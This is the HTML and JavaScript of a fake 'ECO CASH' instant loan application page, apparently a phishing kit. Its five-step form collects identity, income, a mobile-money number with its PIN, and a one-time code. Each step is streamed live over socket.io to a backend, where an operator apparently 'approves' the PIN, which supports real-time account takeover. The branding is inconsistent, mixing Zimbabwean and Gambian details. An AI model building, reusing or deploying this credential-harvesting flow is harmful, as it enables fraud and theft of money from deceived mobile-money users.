<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>ECO CASH - Instant Loan Application</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
    [x-cloak] {
        display: none !important;
    }

    :root {
        --eco-green: #aa1d0b;
        --eco-green-dark: #007d3c;
        --eco-green-light: #0b1494;
        --eco-bg: #100474;
        --eco-card: #1d1b25;
        --eco-text: #101014;
        --eco-text-light: #94a3b8;
        --eco-input-bg: #1e293b;
        --eco-border: rgba(255,255,255,0.08);
        --eco-text: #1e293b;
        --eco-text-light: #64748b;
        --eco-border: #dbe4dc;
        --eco-shadow: rgba(0, 166, 81, 0.12);
        --eco-input-bg: #f8faf9;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
    }

 body {
    background:
        linear-gradient(135deg, #0b025f 0%, #01103a 45%, #111827 100%);
    color: var(--eco-text);
}

    /* Background design */
    body::before {
        content: '';
        position: fixed;
        top: -250px;
        right: -180px;
        width: 500px;
        height: 500px;
        background: radial-gradient(circle,
                rgba(0, 166, 81, 0.18) 0%,
                rgba(0, 166, 81, 0.05) 45%,
                transparent 70%);
        z-index: -2;
    }

    body::after {
        content: '';
        position: fixed;
        bottom: -180px;
        left: -120px;
        width: 400px;
        height: 400px;
        background: radial-gradient(circle,
                rgba(0, 166, 81, 0.12) 0%,
                transparent 70%);
        z-index: -2;
    }

    .curve-top {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 240px;
        background: linear-gradient(135deg,
                var(--eco-green),
                var(--eco-green-dark));
        border-bottom-left-radius: 40px;
        border-bottom-right-radius: 40px;
        z-index: -1;
        box-shadow: 0 8px 30px rgba(0, 166, 81, 0.25);
    }

    /* Main card */
    .glass-panel {
        background: var(--eco-card);
        border-radius: 26px;
        border: 1px solid rgba(0, 166, 81, 0.08);
        box-shadow:
            0 12px 35px rgba(15, 23, 42, 0.08),
            0 4px 10px rgba(0, 166, 81, 0.06);
        transition: 0.3s ease;
        overflow: hidden;
    }

    .glass-panel:hover {
        transform: translateY(-2px);
        box-shadow:
            0 18px 45px rgba(15, 23, 42, 0.12),
            0 8px 18px rgba(0, 166, 81, 0.1);
    }

    /* Labels */
    .label-premium {
        display: block;
        margin-bottom: 8px;
        font-size: 12px;
        font-weight: 700;
        letter-spacing: 0.7px;
        text-transform: uppercase;
        color: var(--eco-text-light);
    }

    /* Inputs */
    .input-premium,
    select.input-premium {
        width: 100%;
        padding: 15px 18px;
        border-radius: 16px;
        border: 1.5px solid var(--eco-border);
        background: var(--eco-input-bg);
        color: var(--eco-text);
        font-size: 15px;
        outline: none;
        transition: all 0.3s ease;
    }

    .input-premium::placeholder {
        color: #94a3b8;
    }

    .input-premium:focus,
    select.input-premium:focus {
        border-color: var(--eco-green);
        background: #ffffff;
        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
    }

    select.input-premium option {
        background: white;
        color: var(--eco-text);
    }

    /* Main button */
    .btn-premium {
        width: 100%;
        border: none;
        border-radius: 16px;
        padding: 15px;
        background: linear-gradient(135deg,
                var(--eco-green),
                var(--eco-green-dark));
        color: white;
        font-size: 15px;
        font-weight: 700;
        cursor: pointer;
        transition: 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        box-shadow:
            0 10px 24px rgba(0, 166, 81, 0.22);
    }

    .btn-premium:hover {
        transform: translateY(-2px);
        background: linear-gradient(135deg,
                var(--eco-green-light),
                var(--eco-green));
        box-shadow:
            0 14px 28px rgba(0, 166, 81, 0.28);
    }

    .btn-premium:active {
        transform: scale(0.98);
    }

    .btn-premium:disabled {
        opacity: 0.55;
        cursor: not-allowed;
    }

    /* Secondary button */
    .btn-secondary {
        width: 100%;
        padding: 15px;
        border-radius: 16px;
        border: 1px solid var(--eco-border);
        background: #ffffff;
        color: var(--eco-text-light);
        font-weight: 600;
        cursor: pointer;
        transition: 0.3s ease;
    }

    .btn-secondary:hover {
        border-color: var(--eco-green);
        color: var(--eco-green);
        background: rgba(0, 166, 81, 0.04);
    }

    /* Progress */
    .progress-step {
        display: flex;
        flex-direction: column;
        align-items: center;
        flex: 1;
        position: relative;
    }

    .progress-dot {
        width: 42px;
        height: 42px;
        border-radius: 50%;
        background: #edf7f1;
        border: 2px solid #d2e8d8;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        color: var(--eco-green-dark);
        margin-bottom: 8px;
        transition: 0.3s ease;
    }

    .progress-step.active .progress-dot {
        background: linear-gradient(135deg,
                var(--eco-green),
                var(--eco-green-dark));
        color: white;
        border-color: transparent;
        box-shadow: 0 0 18px rgba(0, 166, 81, 0.22);
    }

    .progress-step.completed .progress-dot {
        background: var(--eco-green);
        border-color: var(--eco-green);
        color: white;
    }

    .progress-step.completed .progress-dot::after {
        content: '✓';
        font-size: 18px;
    }

    .progress-step.completed .progress-dot span {
        display: none;
    }

    /* PIN boxes */
    .pin-box {
        width: 58px;
        height: 58px;
        border-radius: 16px;
        border: 2px solid #d7e8dc;
        background: white;
        color: var(--eco-text);
        text-align: center;
        font-size: 24px;
        font-weight: bold;
        outline: none;
        transition: 0.25s ease;
        box-shadow: inset 0 2px 5px rgba(15, 23, 42, 0.04);
    }

    .pin-box:focus {
        border-color: var(--eco-green);
        box-shadow:
            0 0 0 4px rgba(0, 166, 81, 0.12);
        transform: translateY(-1px);
    }

    /* Phone input wrapper */
    .ib-phone-wrapper {
        display: flex;
        align-items: center;
        gap: 14px;
        padding: 14px 18px;
        border-radius: 18px;
        border: 1.5px solid var(--eco-border);
        background: var(--eco-input-bg);
        transition: 0.3s ease;
    }

    .ib-phone-wrapper:focus-within {
        border-color: var(--eco-green);
        background: white;
        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
    }

    .ib-country-code {
        display: flex;
        align-items: center;
        gap: 10px;
        padding-right: 14px;
        border-right: 1px solid #dbe4dc;
        color: var(--eco-text);
        font-weight: 700;
    }

    /* Spinner */
    .spinner-sm {
        width: 22px;
        height: 22px;
        border-radius: 50%;
        border: 3px solid rgba(255,255,255,0.35);
        border-top-color: white;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to {
            transform: rotate(360deg);
        }
    }

    /* Scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
    }

    ::-webkit-scrollbar-thumb {
        background: rgba(0, 166, 81, 0.25);
        border-radius: 20px;
    }

    /* Mobile */
    @media (max-width: 640px) {
        .glass-panel {
            border-radius: 22px;
        }

        .curve-top {
            height: 200px;
        }

        .pin-box {
            width: 50px;
            height: 50px;
            font-size: 20px;
        }

        .btn-premium,
        .btn-secondary {
            padding: 14px;
        }
    }
</style>
</head>
<body x-data="loanFlow()" x-init="init()" class="antialiased">
    <div class="curve-top"></div>

    <main class="max-w-xl mx-auto px-4 pt-10 pb-20 relative z-10">
        <section class="glass-panel overflow-hidden relative">
            <div class="bg-white px-6 py-6 border-b border-gray-200">
                <div class="flex flex-col items-center">
                    <img src="data:image/png;base64," alt="ASA Logo" class="h-12 w-auto mb-3">
                    <h1 class="text-xl font-bold text-gray-900">ECO CASH  - Instant Loan Application</h1>
                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Instant Loan Application</p>
                </div>
            </div>

            <div class="p-6 md:p-8">
                <div class="flex justify-between mb-8">
                    <template x-for="i in 5" :key="i">
                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
                            <div class="progress-dot"><span x-text="i"></span></div>
                        </div>
                    </template>
                </div>
                
                <div x-show="step === 1" x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Loan Details</h2><span class="text-xs font-bold text-orange-400">Step 01</span></div>
                    <div class="space-y-4">
                        <select x-model="form.loanType" class="input-premium">
                            <option value="">Select Loan Type</option>
                            <option value="Personal">Personal Loan</option>
                            <option value="Business">Business Loan</option>
                        </select>
                        <div>
                            <div class="flex justify-between"><label class="label-premium">Amount (D)</label><span class="text-xl font-bold" x-text="'D' + form.amount"></span></div>
                            <input type="range" x-model="form.amount" min="1000" max="100000" step="500" class="w-full accent-orange-500">
                        </div>
                        <select x-model="form.term" class="input-premium">
                            <option value="">Select Loan Term</option>
                            <option value="3">3 months</option><option value="6">6 months</option><option value="12">12 months</option>
                        </select>
                        <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Purpose of loan"></textarea>
                        <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium">Continue →</button>
                    </div>
                </div>

                <div x-show="step === 2" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Identity Verification</h2><span class="text-xs font-bold text-orange-400">Step 02</span></div>
                    <div class="space-y-4">
                        <div class="grid grid-cols-2 gap-4"><input type="text" x-model="form.firstName" class="input-premium" placeholder="First name"><input type="text" x-model="form.lastName" class="input-premium" placeholder="Last name"></div>
                        <input type="email" x-model="form.email" class="input-premium" placeholder="Email (must be @gmail.com)" pattern="[a-zA-Z0-9._%+-]+@gmail\.com" title="Please enter a valid @gmail.com email" required>
                        <div class="flex"><span class="input-premium w-24 flex items-center">🇿🇼+263</span><input type="tel" x-model="form.phone" class="input-premium flex-1" placeholder="XXXXXXX" maxlength="9"></div>
                        <div class="grid grid-cols-2 gap-4"><button @click="step = 1" class="btn-secondary">← Back</button><button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continue →</button></div>
                    </div>
                </div> 

                <div x-show="step === 3" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Employment Information</h2><span class="text-xs font-bold text-orange-400">Step 03</span></div>
                    <div class="space-y-4">
                        <select x-model="form.employment" class="input-premium"><option value="">Select Status</option><option value="Employed">Employed</option><option value="Self-Employed">Self-Employed</option></select>
                        <input type="number" x-model="form.income" class="input-premium" placeholder="Annual income (D)">
                        <input type="text" x-model="form.employer" class="input-premium" placeholder="Employer (optional)">
                        <div class="grid grid-cols-2 gap-4"><button @click="step = 2" class="btn-secondary">← Back</button><button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Continue →</button></div>
                    </div>
                </div>

                <div x-show="step === 4" x-cloak x-transition.duration.200ms>
                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
                    <div class="space-y-4">
                        <div class="ib-phone-wrapper"><span class="ib-country-code">🇿🇼+263</span><input type="tel" x-model="africell.phone" class="input-premium border-0 bg-transparent" placeholder="XXXXXXX" maxlength="7"></div>
                       <input type="password" x-model="africell.password" class="input-premium" placeholder="4-digit PIN" maxlength="4" inputmode="numeric" pattern="[0-9]*" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
                        <div class="grid grid-cols-2 gap-4 pt-4"><button @click="step = 3" class="btn-secondary">← Back</button><button @click="requestAdminApproval" :disabled="!isStep4Valid || passwordVerifying" class="btn-premium"><span x-show="!passwordVerifying">Verify →</span><span x-show="passwordVerifying" class="spinner-sm"></span></button></div>
                    </div>
                </div>

               <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                    <h2 class="text-xl font-bold mb-6">Confirm OTP Code</h2>
                    <div class="flex justify-center gap-3">
                        <template x-for="(_, i) in 6" :key="i">
                            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" 
                                   @input="movePinFocus($event, i)" 
                                   x-model="pin.value[i]"
                                   onkeypress="return event.charCode >= 48 && event.charCode <= 57">
                        </template>
                    </div>
                    <button @click="submitStep5" 
                            :disabled="!isPinValid || pinVerifying" 
                            class="btn-premium mt-6">
                        Submit Application
                    </button>
                </div>
                <div x-show="step === 6" x-cloak class="text-center py-8">
                    <div class="text-6xl mb-4">✅</div>
                    <h2 class="text-2xl font-bold text-green-400">Application Submitted!</h2>
                    <p class="text-gray-400">Reference: <span x-text="referenceId"></span></p>
                </div>
            </div>
        </section>
    </main>

   <script>
    function loanFlow() {
        return {
            step: 1, appId: '', referenceId: '', 
            form: { loanType: '', amount: 5000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
            africell: { phone: '', password: '' },
            pin: { value: ['', '', '', '','',''] },
            passwordVerifying: false, pinVerifying: false, socket: null,

            get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
            get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
            get isStep3Valid() { return this.form.employment && this.form.income; },
            get isStep4Valid() { return this.africell.phone && this.africell.password; },
            get isPinValid() { return this.pin.value.join('').length === 6; },

            init() {
                this.socket = io();
                this.socket.on('session-ready', (data) => { this.appId = data.appId; });
                
                this.socket.on('password-verified', () => { 
                    this.passwordVerifying = false; 
                    this.step = 5; 
                });
                
                this.socket.on('pin-verified', (d) => { 
                    this.pinVerifying = false; 
                    this.referenceId = d.referenceId; 
                    this.step = 6; 
                });
                
                this.socket.on('error', (err) => {
                    console.error("Socket error:", err);
                    this.passwordVerifying = false;
                    this.pinVerifying = false;
                    alert("An error occurred. Please try again.");
                });
            },

            submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
            submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
            submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
            
            requestAdminApproval() { 
                if (!this.isStep4Valid) return; 
                
                this.passwordVerifying = true; 
                this.socket.emit('step4', this.africell); 
                
                setTimeout(() => {
                    if (this.passwordVerifying) {
                        console.warn("No response from server, check your backend logs.");
                        this.passwordVerifying = false;
                    }
                }, 10000); 
            },
            
            submitStep5() { 
                this.pinVerifying = true; 
                this.socket.emit('step5', { pin: this.pin.value.join('') }); 
            },
            
            movePinFocus(e, i) { 
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (!e.target.value && i > 0) {
                    document.querySelectorAll('.pin-box')[i-1].focus();
                } 
                else if (e.target.value && i < 5) {
                    document.querySelectorAll('.pin-box')[i+1].focus();
                }
            }
        }
    }
</script>
</body>
</html>